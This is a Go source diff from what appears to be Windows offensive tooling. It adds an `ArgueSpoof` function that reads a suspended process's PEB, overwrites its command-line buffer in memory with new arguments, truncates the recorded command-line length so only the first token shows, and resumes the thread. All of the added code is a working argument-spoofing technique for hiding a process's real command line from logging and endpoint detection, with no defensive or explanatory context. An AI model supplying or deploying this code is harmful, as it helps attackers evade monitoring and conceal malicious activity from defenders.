@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"golang.org/x/sys/windows"
 	"main/util"
+	"strings"
 	"syscall"
 	"unsafe"
 )
@@ -114,4 +115,54 @@ func Runu(b []byte) ([]byte, error) {
 
 	return []byte("success"), nil
 
+}
+
+func ArgueSpoof(pI windows.ProcessInformation, b []byte) error {
+	var (
+		pbi        windows.PROCESS_BASIC_INFORMATION
+		pebLocal   windows.PEB
+		parameters windows.RTL_USER_PROCESS_PARAMETERS
+	)
+
+	arg := string(b)
+
+	// Retrieve information on PEB location in process
+	err := windows.NtQueryInformationProcess(pI.Process, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), uint32(unsafe.Sizeof(pbi)), nil)
+	if err != nil {
+		return err
+	}
+
+	// Read the PEB from the target process
+	err = windows.ReadProcessMemory(pI.Process, uintptr(unsafe.Pointer(pbi.PebBaseAddress)), (*byte)(unsafe.Pointer(&pebLocal)), unsafe.Sizeof(windows.PEB{}), nil)
+	if err != nil {
+		return err
+	}
+
+	// Grab the ProcessParameters from PEB
+	err = windows.ReadProcessMemory(pI.Process, uintptr(unsafe.Pointer(pebLocal.ProcessParameters)), (*byte)(unsafe.Pointer(&parameters)), unsafe.Sizeof(windows.RTL_USER_PROCESS_PARAMETERS{}), nil)
+	if err != nil {
+		return err
+	}
+
+	// Set the actual arguments we are looking to use
+
+	arg16, _ := windows.UTF16PtrFromString(arg)
+	err = windows.WriteProcessMemory(pI.Process, uintptr(unsafe.Pointer(parameters.CommandLine.Buffer)), (*byte)(unsafe.Pointer(arg16)), uintptr(len(arg)*2+1), nil)
+	if err != nil {
+		return err
+	}
+
+	args := strings.Split(arg, " ")
+	newUnicodeLen := len(args[0]) * 2
+	err = windows.WriteProcessMemory(pI.Process, uintptr(unsafe.Pointer(pebLocal.ProcessParameters))+unsafe.Offsetof(windows.RTL_USER_PROCESS_PARAMETERS{}.CommandLine), (*byte)(unsafe.Pointer(&newUnicodeLen)), 4, nil)
+	if err != nil {
+		return err
+	}
+
+	_, err = windows.ResumeThread(pI.Thread)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
